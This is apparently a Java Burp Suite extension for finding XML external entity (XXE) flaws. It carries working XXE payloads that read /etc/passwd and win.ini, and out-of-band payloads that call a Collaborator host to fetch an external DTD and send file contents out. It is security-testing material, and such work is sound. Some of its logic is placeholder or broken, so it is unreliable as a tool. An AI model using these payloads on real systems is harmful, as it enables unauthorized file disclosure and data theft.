import burp.*;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender, IHttpListener, IScannerCheck, IExtensionStateListener, IContextMenuFactory {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private IBurpCollaboratorClientContext collaboratorContext;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.collaboratorContext = callbacks.createBurpCollaboratorClientContext();

        callbacks.setExtensionName("Comprehensive XXE Scanner with Collaborator");
        callbacks.registerHttpListener(this);
        callbacks.registerScannerCheck(this);
        callbacks.registerExtensionStateListener(this);
        callbacks.registerContextMenuFactory(this);

        stdout.println("Comprehensive XXE Scanner with Collaborator Extension Loaded");
    }

    // IHttpListener implementation
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (messageIsRequest) {
            IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
            String request = new String(messageInfo.getRequest());

            if (request.contains("<?xml")) {
                stdout.println("Potential XML request found");
                injectXXEPayloads(messageInfo);
            }
        }
    }

    private void injectXXEPayloads(IHttpRequestResponse messageInfo) {
        List<String> payloads = getXXEPayloads();
        IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
        IHttpService httpService = messageInfo.getHttpService();
        List<String> headers = requestInfo.getHeaders();

        for (String payload : payloads) {
            byte[] requestBody = payload.getBytes();
            byte[] newRequest = helpers.buildHttpMessage(headers, requestBody);
            
            IHttpRequestResponse testRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
            analyzeResponse(testRequestResponse, payload);
        }
    }

    private void analyzeResponse(IHttpRequestResponse testRequestResponse, String payload) {
        String response = new String(testRequestResponse.getResponse());

        if (response.contains("root:x") || response.contains("[extensions]") || response.contains("example.com")) {
            stdout.println("XXE vulnerability detected with payload: " + payload);
            reportIssue(testRequestResponse, "XXE Vulnerability", "The application is vulnerable to XXE Injection using payload: " + payload, "High");
        }

        // Check for Collaborator interactions
        List<IBurpCollaboratorInteraction> interactions = collaboratorContext.fetchAllCollaboratorInteractions();
        for (IBurpCollaboratorInteraction interaction : interactions) {
            if (interaction.getProperty("payload").equals(payload)) {
                stdout.println("Collaborator interaction detected: " + interaction);
                reportIssue(testRequestResponse, "XXE Vulnerability via Collaborator", "The application is vulnerable to XXE Injection using Collaborator payload: " + payload, "High");
            }
        }
    }

    private void reportIssue(IHttpRequestResponse messageInfo, String issueName, String issueDetail, String severity) {
        IHttpService httpService = messageInfo.getHttpService();
        URL url = helpers.analyzeRequest(messageInfo).getUrl();

        IScanIssue issue = new CustomScanIssue(
            httpService,
            url,
            messageInfo,
            issueName,
            issueDetail,
            severity
        );

        callbacks.addScanIssue(issue);
    }

    // IScannerCheck implementation
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        // Example: Perform a simple passive scan
        List<IScanIssue> issues = new ArrayList<>();
        String response = helpers.bytesToString(baseRequestResponse.getResponse());

        if (response.contains("example-vulnerability")) {
            issues.add(new CustomScanIssue(
                baseRequestResponse.getHttpService(),
                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                baseRequestResponse,
                "Example Vulnerability",
                "This is an example of a detected vulnerability.",
                "High"
            ));
        }

        return issues;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Example: Perform a simple active scan
        List<IScanIssue> issues = new ArrayList<>();
        String payload = "example-payload";
        byte[] request = insertionPoint.buildRequest(payload.getBytes());
        IHttpRequestResponse response = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request);

        if (helpers.bytesToString(response.getResponse()).contains("example-vulnerability")) {
            issues.add(new CustomScanIssue(
                baseRequestResponse.getHttpService(),
                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                response,
                "Example Vulnerability",
                "This is an example of a detected vulnerability.",
                "High"
            ));
        }

        return issues;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return existingIssue.getIssueName().equals(newIssue.getIssueName()) ? -1 : 0;
    }

    // IExtensionStateListener implementation
    @Override
    public void extensionUnloaded() {
        stdout.println("Extension was unloaded");
    }

    // IContextMenuFactory implementation
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();
        JMenuItem exampleItem = new JMenuItem(new AbstractAction("Example Menu Item") {
            @Override
            public void actionPerformed(ActionEvent e) {
                stdout.println("Example menu item clicked");
            }
        });
        menuItems.add(exampleItem);
        return menuItems;
    }

    // Helper method to get XXE payloads
    private List<String> getXXEPayloads() {
        List<String> payloads = new ArrayList<>();
        String collaboratorPayload = collaboratorContext.generatePayload(true);

        payloads.add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>");
        payloads.add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>");
        payloads.add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://" + collaboratorPayload + "\" >]><foo>&xxe;</foo>");
        payloads.add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://" + collaboratorPayload + "/?pwned=%25file:///etc/passwd%25\" >]><foo>&xxe;</foo>");
        payloads.add("<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://" + collaboratorPayload + "/evil.dtd\"> %xxe; ]><foo></foo>");
        payloads.add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\" >]><foo>&xxe;</foo>");
        payloads.add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ftp://example.com/file.txt\" >]><foo>&xxe;</foo>");
        return payloads;
    }

    // CustomScanIssue class to represent detected issues
    private static class CustomScanIssue implements IScanIssue {
        private final IHttpService httpService;
        private final URL url;
        private final IHttpRequestResponse httpMessages;
        private final String name;
        private final String detail;
        private final String severity;

        public CustomScanIssue(IHttpService httpService, URL url, IHttpRequestResponse httpMessages, String name, String detail, String severity) {
            this.httpService = httpService;
            this.url = url;
            this.httpMessages = httpMessages;
            this.name = name;
            this.detail = detail;
            this.severity = severity;
        }

        @Override
        public URL getUrl() {
            return url;
        }

        @Override
        public String getIssueName() {
            return name;
        }

        @Override
        public int getIssueType() {
            return 0;
        }

        @Override
        public String getSeverity() {
            return severity;
        }

        @Override
        public String getConfidence() {
            return "Certain";
        }

        @Override
        public String getIssueBackground() {
            return null;
        }

        @Override
        public String getRemediationBackground() {
            return null;
        }

        @Override
        public String getIssueDetail() {
            return detail;
        }

        @Override
        public String getRemediationDetail() {
            return null;
        }

        @Override
        public IHttpRequestResponse[] getHttpMessages() {
            return new IHttpRequestResponse[]{httpMessages};
        }

        @Override
        public IHttpService getHttpService() {
            return httpService;
        }
    }
}
